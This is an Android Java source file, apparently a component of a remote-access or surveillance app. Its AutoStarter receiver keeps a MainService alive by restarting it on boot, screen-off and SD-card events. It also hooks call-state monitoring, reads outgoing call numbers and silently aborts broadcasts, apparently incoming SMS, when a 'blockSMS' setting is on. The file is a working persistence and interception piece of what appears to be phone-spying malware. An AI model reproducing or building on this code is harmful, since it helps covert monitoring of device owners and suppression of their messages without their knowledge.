package com.remote.app;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.remote.app.Managers.Calls.PhoneListener;

public class AutoStarter  extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {

        /*if(isMyServiceRunning(context)) {
            Log.v("MYLOGS", "Yeah, it's running, no need to restart service");
        }
        else {
            Log.v("MYLOGS", "Not running, restarting service");
            Intent intent1 = new Intent(context, MainService.class);
            context.startService(intent1);
        }*/

        if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
            Intent pushIntent = new Intent(context, MainService.class);
            context.startService(pushIntent);
        }

        if(intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED))
        {
            Toast.makeText(context, "Boot", Toast.LENGTH_LONG).show();

            Log.i("com.connect", "Boot");
            if(isMyServiceRunning(context)==false)
            {
                context.startService(new Intent(context, MainService.class));
                Log.i("com.connect","Boot Run Service");
            }
        }

        if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF))
        {
            if(isMyServiceRunning(context)==false)
            {
                context.startService(new Intent(context, MainService.class));
                Log.i("com.connect","Screen Off Run Service");
            }
        }

        if (intent.getAction().equals(Intent.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE))
        {
            Log.i("com.connect", "SD Card");
            if(isMyServiceRunning(context)==false)
            {
                context.startService(new Intent(context, MainService.class));
                Log.i("com.connect","Screen Off Run Service");
            }
        }

        if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
            String numberToCall = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        }

        PhoneListener phoneListener = new PhoneListener(context);
        TelephonyManager telephony = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
        telephony.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);

        if(context.getSharedPreferences("settings", Context.MODE_PRIVATE).getBoolean("blockSMS",false)==true)
        {
            Bundle extras = intent.getExtras();

            if ( extras != null )
            {
                if(context.getSharedPreferences("settings", Context.MODE_PRIVATE).getBoolean("blockSMS",false)==true)
                    this.abortBroadcast();
            }
        }



    }

    private boolean isMyServiceRunning(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (MainService.class.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
}
